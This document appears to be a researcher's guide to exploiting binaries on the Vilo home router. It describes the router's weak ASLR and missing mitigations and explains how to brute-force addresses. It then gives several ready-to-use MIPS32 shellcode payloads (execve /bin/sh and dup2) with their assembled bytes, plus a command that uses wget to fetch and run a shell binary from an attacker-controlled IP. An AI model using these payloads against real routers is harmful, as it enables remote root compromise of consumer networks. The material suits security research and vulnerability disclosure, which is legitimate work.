# Vilo Router Binary Exploitation Guidelines
Since everything running on the router is a compiled MIPS binary, we decided to make a section dedicated to explaining the setup of the router, binary mitigations, gadgets, and other helpful tips for exploiting vulnerabilities. In the [Emulation](./Emulation.md) and [Exfiltration](./Exfiltration.md) pages, we discuss how to emulate the firmware locally, how to compile C code for the device, and even provide a pre-compiled `gdbserver` binary for the router.

## Vilo Operating System
The Vilo router runs on a Linux kernel version `3.10.90` with BusyBox v1.13.4 on top of it. Everything not in `/tmp` or `/hualai` is stored in read-only memory, which means dependencies like the uClibc library *cannot* be changed. However, the binaries that run the TCP network service on port 5432 are stored in `/hualai` and changed with each update.

The processor runs 32-bit, little endian MIPS rel2 assembly. All the compiled binaries use this architecture and the uClibc library (not glibc). All binaries run as root, so privilege escalation is not needed.

ASLR **is** enabled for the operating system. But looking at `/proc/<pid>/maps` for the relevant binaries reveals a few interesting tidbits (see these exported maps in [the pwn folder](./pwn/)):
* There are only 4 randomized nibbles in the ASLR. Here are the stack addresses for 2 binaries across 2 reboots:
    ```
    7fd60000-7fd84000
    7ffa8000-7ffcc000
    7ff78000-7ff9c000
    7fc24000-7fc48000
    ```
    * The stack addresses always start with `7f` and end with `000`. This means there's (2 ** 24 bits = ) 16777216 possibilities. In addition, if binaries like `hl_client` or `iperf3` crash, they are automatically restarted with almost no downtime! This means ASLR can be brute forced for any address in any binary, but it will take a while. Assuming you can guess 10 addresses per second, it would take almost 20 days to guess a single address reliably. 
* ASLR here is weird because it doesn't separate memory as much as 64-bit x86 does. Memory is split into 3 sections, with each section having a random amount of space in between each other: `other processes' stack + libraries + binary + heap`, `stack`, and `vdso` (in that order).
    * This means that *if you get a heap or binary or library leak, you know the addresses for all libraries, the heap, the binary, and even other processes' stacks*.
    * Because the stack always comes after that big chunk of memory, that can make brute forcing stack addresses even more likely because you know it's going to be more at the end of the available brute-forcing space. 
* If PIE is disabled, then the `binary + heap` memory sections are at known consecutive addresses.
    * This means a binary leak also gives a heap leak, but separate library + stack leaks are needed. 
* There are several unexpected (in our eyes) memory sections, such as `/SYSVxxxxxxxx (deleted)` and `[stack:xxxx]`. The `SYSV` sections indicate shared memory allocated for multiple processes that was deleted, and the `stack` sections contain the stack for processes that don't actually exist anymore (when compared with the current process list). We are unsure whether those sections legitimately exist and, if they do, whether there are any useful gadgets or strings present there.
* There are two RWX sections present in memory, namely the stack and the heap (the `stack` sections from other processes are not executable), giving us the ability to use shellcode.

## Binary Mitigations
Every file in `/bin`, every file in `/sbin`, `/hualai/hl_client`, `/hualai/hlRouterApp`, and `/hualai/boa/boa` have the same (lack of) protections:
```
Arch:     mips-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX unknown - GNU_STACK missing
PIE:      No PIE (0x400000)
Stack:    Executable
RWX:      Has RWX segments
```

All the libraries in `/lib` have PIE enabled, most of them have NX enabled + no RELRO, and only `libuClibc-0.9.33.so` has canaries.

The `/hualai/iperf3` binary has the following protections:
```
Arch:     mips-32-little
RELRO:    No RELRO
Stack:    Canary found
NX:       NX unknown - GNU_STACK missing
PIE:      PIE enabled
Stack:    Executable
RWX:      Has RWX segments
```

## Shellcode
A fantastic explanation and example of little-endian MIPS32 shellcode can be found [here](https://fireshellsecurity.team/writing-a-shellcode-for-mips32/). The snippet they provided is great, as it's only 48 bytes with no null bytes, no whitespace, no double quotes, and calls `execve("//bin/sh",NULL,NULL)` using syscalls. However, this code (even after adapted for endianness) will not work for us for 2 reasons: `execve` ALWAYS requires the `args` argument on the router (for a reason I don't understand), and because of sockets we don't have access to stdin/stdout.

To get around that, we need to create our own shellcode with args and some way to access the shell. We could duplicate file descriptors, or spawn a bind/reverse shell. Depending on the situation, it's possible that the socket is already closed, so spawning a bind/reverse shell is the most reliable candidate. 

Unfortunately, many of the methods of spawning shells involve utilities and binaries that don't exist (such as `bash` or `nc`), however we can make a `wget` request to an IP we own, download a compiled bind shell, and run it. Therefore, a command like `execve("/bin/sh", {"-c", "wget http://101.102.103.104:4444 -qO-|ash", NULL},NULL)` will allow us to run whatever code we want remotely. On the server, it can have the following command - `wget http://1.2.3.4:4444/shell -O /tmp/s && chmod +x /tmp/s && /tmp/s`.

To test out shellcode on the actual router, I wrote [`shellcode.c`](./pwn/shellcode.c) (compiled version [here](./pwn/shellcode)), which listens on port 4444, reads in up to 300 raw bytes, and executes them as MIPS instructions. You are meant to have established a shell on the router, `wget` this binary to the machine, and run it, getting the raw bytes over the network from your pwntools script on your main machine.

Several variations of relevant shellcode are found below, along with a list of limitations, allowing you to choose whichever best suits your situation. Ensure you have the `binutils-mips-linux-gnu` apt dependency before trying to compile the code through pwntools.

### General Shellcode Notes
* Unlike in x86, each assembly instruction uses exactly 4 bytes. This means we only need to worry about the number of instructions and not the length of each instruction when golfing our shellcode, but that also means our shellcode is likely to take up more space.
* Since each instruction uses 4 bytes, it's impossible for a single instruction to move 4 bytes into a register (since some bits need to specify the operation, destination register, etc.). This means you can move a **maximum of 2 bytes into a register per instruction**, which is why it takes 4 instructions (16 bytes) to move "//bin/sh" into the `$t6` and `$t7` registers in the second example below.

### `/bin/sh` - 32 bytes
* Command - `execve("/bin/sh", NULL, NULL)`
* Length - 32
* Notes
    * **DOES** contain null bytes
    * No whitespace
    * Suitable for stack shellcode
* **Note - NOT SUITABLE FOR VILO USAGE** as the second argument is set to NULL, simply an educational addition

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bgezal $zero, getpc     # \x00\x00\x11\x04
getpc:
    addiu $a0, $ra, 0x10    # \x10\x00\xe4\x27
    slti $a1, $zero, -1     # \xff\xff\x05\x28
    slti $a2, $zero, -1     # \xff\xff\x06\x28
    li $v0, 4011            # \xab\x0f\x02\x24
    syscall 0xd1337         # \xcc\xcd\x44\x03
.asciiz "/bin/sh"           # \x2f\x62\x69\x6e\x2f\x73\x68\x00
''')

# Shellcode = b"\x00\x00\x11\x04\x10\x00\xe4'\xff\xff\x05(\xff\xff\x06(\xab\x0f\x02$\xcc\xcd\x44\x03/bin/sh\x00"
```

### `/bin/sh` - 44 bytes
* Command - `execve("/bin/sh", NULL, NULL)`
* Length - 44
* Notes
    * No null bytes
    * No whitespace
    * Suitable for stack shellcode
* **Note - NOT SUITABLE FOR VILO USAGE** as the second argument is set to NULL, simply an educational addition 

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bltzal  $zero, getpc
getpc:
    addiu   $v0, $zero, 0xfab
    slti    $a2, $zero, -1
    slti    $a1, $zero, -1
    addiu   $a0, $ra, 0x101
    addiu   $t4, $a0, -0xdd
    sb      $a2, -1($t4)
    addiu   $a0, $a0, -0xe5
    syscall 0x040405
    .word   0x6e69622f
    .word   0x6168732f
''')
shellcode = b'\xff\xff'+shellcode[2:]

# Shellcode = b"\xff\xff\x10\x04\xab\x0f\x02$\xff\xff\x06(\xff\xff\x05(\x01\x01\xe4'#\xff\x8c$\xff\xff\x86\xa1\x1b\xff\x84$L\x01\x01\x01/bin/sha"
```

### `/bin/sh` - 40 bytes
* Command - `execve("/bin/sh", {"/bin/sh", NULL}, NULL)`
* Length - 40
* Notes
    * **DOES** contain null bytes
    * **DOES** contain whitespace
    * Suitable for most shellcode - (`$sp` to `$sp+0x8` are overwritten, so as long as those addresses don't contain future shellcode bytes, it's okay)

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bltzal  $zero, getpc        # \x00\x00\x10\x04
getpc:
    addiu   $v0, $zero, 0xfab   # \xab\x0f\x02\x24
    addi    $a2, $v0, -0xfab    # \x55\xf0\x46\x20
    addi    $a0, $ra, 0x18      # \x18\x00\xe4\x23
    sw      $a0, 0x0($sp)       # \x00\x00\xa4\xaf
    sw      $a2, 0x4($sp)       # \x04\x00\xa6\xaf
    move    $a1, $sp            # \x25\x28\xa0\x03
    syscall 0xd1337             # \xcc\xcd\x44\x03
.string "/bin/sh"               # \x2f\x62\x69\x6e\x2f\x73\x68\x00
''')

# Shellcode = b'\x00\x00\x10\x04\xab\x0f\x02$U\xf0F \x18\x00\xe4#\x00\x00\xa4\xaf\x04\x00\xa6\xaf%(\xa0\x03\xcc\xcdD\x03/bin/sh\x00'
```

### `/bin/sh` - 52 bytes
* Command - `execve("/bin/sh", {"/bin/sh", NULL}, NULL)`
* Length - 52
* Notes
    * No null bytes
    * No whitespace
    * Suitable for most stack shellcode (`$sp-0x8` to `$sp` are overwritten, so as long as those addresses don't contain future shellcode bytes, it's okay)

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
shellcode = asm('''
    bltzal  $zero, getpc        # \xff\xff\x10\x04
getpc:
    addiu   $v0, $zero, 0xfab   # \xab\x0f\x02\x24
    slti    $a2, $zero, -1      # \xff\xff\x06\x28
    addiu   $a0, $ra, 0x101     # \x01\x01\xe4\x27
    addiu   $t4, $a0, -0xd5     # \x2b\xff\x8c\x24
    sb      $a2, -1($t4)        # \xff\xff\x86\xa1
    addiu   $a0, $a0, -0xdd     # \x23\xff\x84\x24
    sw      $a0, -8($sp)        # \xf8\xff\xa4\xaf
    sw      $a2, -4($sp)        # \xfc\xff\xa6\xaf
    addiu   $a1, $sp, -8        # \xf8\xff\xa5\x27
    syscall 0x040405            # \x4c\x01\x01\x01
    .word   0x6e69622f
    .word   0x6168732f
''')
shellcode = b'\xff\xff'+shellcode[2:]

# Shellcode - b"\xff\xff\x10\x04\xab\x0f\x02$\xff\xff\x06(\x01\x01\xe4'+\xff\x8c$\xff\xff\x86\xa1#\xff\x84$\xf8\xff\xa4\xaf\xfc\xff\xa6\xaf\xf8\xff\xa5'L\x01\x01\x01/bin/sha"
```

### `dup2` - 32 bytes
* Command - `dup2()`
* Length - 32
* Notes
    * This shellcode is meant to be **prepended** to one of the above `/bin/sh` shellcode payloads, and allows you to communicate with the shell over a socket.
    * The file descriptor for the socket must be known beforehand, or it can be brute-forced
    * **DOES** contain null bytes
    * No whitespace

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
fd = 7
shellcode = asm(f'''
li $v0, 4063        # \xdf\x0f\x02\x24
li $a0, {fd}        # \x07\x00\x04\x24
li $a1, 0           # \x00\x00\x05\x24
syscall 0x040405    # \x4c\x01\x01\x01
li $a1, 1           # \x01\x00\x05\x24
syscall 0x040405    # \x4c\x01\x01\x01
li $a1, 2           # \x02\x00\x05\x24
syscall 0x040405    # \x4c\x01\x01\x01
''')

# Shellcode - b'\xdf\x0f\x02$\x07\x00\x04$\x00\x00\x05$L\x01\x01\x01\x01\x00\x05$L\x01\x01\x01\x02\x00\x05$L\x01\x01\x01'
```

### `dup2` - 40 bytes
* Command - `dup2()`
* Length - 40
* Notes
    * This shellcode is meant to be **prepended** to one of the above `/bin/sh` shellcode payloads, and allows you to communicate with the shell over a socket.
    * The file descriptor for the socket must be known beforehand, or it can be brute-forced
    * No null bytes
    * No whitespace (except for a few fd values that will give whitespace)

```python
from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
fd = 7
shellcode = asm(f'''
li $v0, 4063                # \xdf\x0f\x02\x24
slti $a0, $zero, -1         # \xff\xff\x04\x28
li $t6, -257                # \xff\xfe\x0e\x24
addi $a0, $t6, {0x101 + fd} # \x08\x01\xc4\x21
slti $a1, $zero, -1         # \xff\xff\x05\x28
syscall 0x040405            # \x4c\x01\x01\x01
addi $a1, $t6, 0x102        # \x02\x01\xc5\x21
syscall 0x040405            # \x4c\x01\x01\x01
addi $a1, $t6, 0x103        # \x03\x01\xc5\x21
syscall 0x040405            # \x4c\x01\x01\x01
''')

# Shellcode - b'\xdf\x0f\x02$\xff\xff\x04(\xff\xfe\x0e$\x08\x01\xc4!\xff\xff\x05(L\x01\x01\x01\x02\x01\xc5!L\x01\x01\x01\x03\x01\xc5!L\x01\x01\x01'
```